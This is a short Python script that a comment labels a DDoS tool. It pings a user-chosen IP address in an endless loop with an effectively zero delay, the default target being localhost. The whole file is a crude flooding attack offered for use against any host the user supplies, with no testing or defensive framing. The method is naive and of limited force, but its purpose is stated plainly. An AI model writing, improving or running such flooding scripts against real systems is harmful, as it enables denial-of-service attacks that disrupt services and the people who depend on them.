import subprocess
import time

def ping_ip(ip_address):
    """
    Ping an IP address once.
    """
    command = ["ping", "-c", "1", ip_address]
    try:
        subprocess.run(command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    ip_address = "127.0.0.1"  # Replace with your ddos ip adress

    # Send pings at a rapid rate
    while True:
        ping_ip(ip_address)
        time.sleep(0.0000000000000000000000000000001)  # Wait for 0.0000000000000000000000000000001 seconds between pings
